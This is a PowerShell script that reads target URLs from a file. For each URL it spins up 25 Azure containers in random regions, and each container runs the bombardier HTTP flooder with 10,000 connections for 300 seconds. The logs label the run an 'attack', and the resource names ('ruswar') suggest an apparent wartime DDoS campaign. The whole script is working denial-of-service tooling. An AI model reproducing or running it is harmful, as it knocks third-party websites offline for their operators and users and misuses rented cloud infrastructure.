param(
    [string] $UrlsPath = "./urls.txt",
    [int] $AgentCount = 10000,
    [string] $ExecutionTime = "300s",
    [int] $FinishTimeout = 350
)

. .\Logging.ps1

LogInfo "==== Start Attack ===="
LogDebug "Read file: $UrlsPath"
$urls = [System.IO.File]::ReadLines($UrlsPath)

$id = 1

ForEach ($url in $urls) {
    $resourceGroup = "rg-rw-attack-$(Get-Date -Format "MM-dd")-" + $id
    $id++

    az group create --location westus --name $resourceGroup
    
    for ($i = 0; $i -lt 25; $i++) {
        $location = .\GetRandomLocation

        $name = "ruswar" + $i
        LogInfo "ResouceGroup: ${resourceGroup} Container: ${name} location: ${location} url: ${url}";

        az container create --resource-group $resourceGroup --name $name --image alpine/bombardier:latest --restart-policy OnFailure --command-line "/gopath/bin/bombardier -c 10000 -d 300s --http1 -l ${url}" --location $location
    }
    
    LogInfo "Waiting $FinishTimeout sec for all containers to finish. Url: ${url}";

    Start-Sleep -Seconds $FinishTimeout

    LogInfo "Deleting resource group ${resourceGroup}";
    az group delete --resource-group $resourceGroup --yes
}

LogInfo "==== Finish Attack ====";
[console]::beep(500,1000)
